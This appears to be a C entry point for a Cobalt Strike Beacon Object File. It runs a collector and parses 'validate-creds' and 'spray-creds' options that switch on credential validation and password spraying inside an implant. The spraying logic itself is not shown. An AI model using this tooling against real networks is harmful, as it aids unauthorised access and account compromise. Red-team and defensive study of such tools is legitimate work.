#include "beacon.h"
#include "ph_graph.h"

static void ph_beacon_emit(void *context, const char *data, int length) {
    (void)context;
    BeaconOutput(CALLBACK_OUTPUT_UTF8, data, length);
}

/* Cobalt Strike BOF entry point. */
void go(char *args, int length) {
    PH_GRAPH graph;
    ph_graph_init(&graph, ph_beacon_emit, NULL);
    if (args && length > 0) {
        static const char option[] = "validate-creds";
        static const char spray_option[] = "spray-creds";
        for (int at = 0; at + (int)sizeof(option) - 1 <= length; at++) {
            int i = 0;
            while (i < (int)sizeof(option) - 1 && args[at + i] == option[i]) i++;
            if (i == (int)sizeof(option) - 1) { graph.validate_credentials = TRUE; break; }
        }
        for (int at = 0; at + (int)sizeof(spray_option) - 1 <= length; at++) {
            int i = 0;
            while (i < (int)sizeof(spray_option) - 1 && args[at + i] == spray_option[i]) i++;
            if (i == (int)sizeof(spray_option) - 1) { graph.validate_credentials = TRUE; graph.spray_credentials = TRUE; break; }
        }
    }
    ph_collect(&graph);
    ph_graph_dispose(&graph);
}

